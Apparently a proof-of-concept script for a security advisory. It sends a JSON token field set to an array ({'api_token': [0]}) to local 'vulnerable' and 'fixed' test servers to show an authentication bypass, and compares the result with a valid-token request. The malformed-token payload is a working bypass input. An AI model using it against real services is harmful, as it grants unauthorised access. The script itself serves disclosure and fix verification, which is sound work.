#!/usr/bin/env python3
import argparse
import http.client
import json
import logging
import sys
import time
import urllib.parse

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger("poc")

parser = argparse.ArgumentParser(description="GHSA-f9x3-7vq9-cph6 PoC")
parser.add_argument("vuln_url", nargs="?", default="http://127.0.0.1:8891")
parser.add_argument("fixed_url", nargs="?", default="http://127.0.0.1:8892")
parser.add_argument("--proxy", help="proxy de inspecao (Burp/mitmproxy), ex.: 127.0.0.1:8080")
args = parser.parse_args()

vuln_url = args.vuln_url
fixed_url = args.fixed_url

user_token = "b7f9d2c4a8e6b1f3d5a0c9e2b4d6f8a1c"


def post(base_url, payload):
    target = urllib.parse.urlsplit(base_url)
    if args.proxy:
        proxy = urllib.parse.urlsplit(args.proxy if "//" in args.proxy else f"http://{args.proxy}")
        connection = http.client.HTTPConnection(proxy.hostname, proxy.port or 8080)
        path = f"http://{target.netloc}/"
        headers = {"Host": target.netloc, "Content-Type": "application/json"}
    else:
        connection = http.client.HTTPConnection(target.hostname, target.port)
        path = "/"
        headers = {"Content-Type": "application/json"}
    started = time.perf_counter()
    connection.request("POST", path, body=json.dumps(payload), headers=headers)
    response = connection.getresponse()
    raw = response.read().decode()
    elapsed_ms = (time.perf_counter() - started) * 1000
    connection.close()
    try:
        parsed = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        parsed = {}
    return response.status, parsed, elapsed_ms


probes = [
    ("vuln ", vuln_url, {"api_token": [0]}),
    ("vuln ", vuln_url, {"api_token": user_token}),
    ("fixed", fixed_url, {"api_token": [0]}),
]

try:
    for app, base_url, payload in probes:
        status, body, elapsed_ms = post(base_url, payload)
        who = body.get("authenticated_as", body.get("error", "-"))
        via = f" via {args.proxy}" if args.proxy else ""
        log.info("[*] %s POST %s -> %s %s (%d ms)%s",
                 app, json.dumps(payload), status, who, elapsed_ms, via)
except OSError as error:
    log.error("%s (proxy: %s)", error, args.proxy or "direto")
    sys.exit(1)
